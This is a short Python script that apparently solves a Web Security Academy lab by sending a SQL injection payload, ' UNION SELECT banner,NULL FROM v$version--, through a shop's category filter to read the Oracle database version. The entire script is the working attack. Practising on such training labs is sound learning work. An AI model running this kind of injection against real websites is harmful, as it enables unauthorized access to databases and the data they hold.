import requests, urllib.parse

def encodeURI(s):
    return urllib.parse.quote(s)

URL = "https://0ac1005f042004e380ed2bd700140095.web-security-academy.net/"
PARAM = "filter?category="
PAYLOAD = "' UNION SELECT banner,NULL FROM v$version--"

requests.get(URL + PARAM + encodeURI(PAYLOAD))